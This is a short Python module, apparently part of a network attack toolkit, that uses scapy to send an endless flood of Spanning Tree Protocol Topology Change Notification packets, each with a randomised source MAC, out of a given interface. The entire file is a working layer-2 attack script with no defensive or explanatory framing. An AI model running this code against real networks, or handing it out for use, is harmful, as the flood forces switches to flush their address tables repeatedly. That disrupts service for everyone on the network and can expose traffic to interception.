# -*- coding: utf-8 -*-

from scapy.layers.l2 import Dot3, LLC, STP
from scapy.all import sendp, RandMAC


# --------------------------------------------------------------------------
#                           STP TCN ATTACK
# --------------------------------------------------------------------------

def run(inter):
    """
    This function launch STP TCN ATTACK
    :param inter: interface to be launched the attack
    :type inter: str
    """

    interface = str(inter[0])
    if len(interface) > 0:
        try:
            while 1:
                # dst=Ethernet Multicast address used for spanning tree protocol
                srcMAC = str(RandMAC())     # Random MAC in each iteration
                p_ether = Dot3(dst="01:80:c2:00:00:00", src=srcMAC)
                p_llc = LLC()
                p_stp = STP(bpdutype=0x80)   # TCN packet
                pkt = p_ether/p_llc/p_stp   # STP packet structure

                sendp(pkt, iface=interface, verbose=0)

        except KeyboardInterrupt:
            pass


def run_attack(config):
    """ This function is used for launch the STP TCN attack
    :param config: GlobalParameters option instance
    :type config: `GlobalParameters`

    """
    run(config.interface)


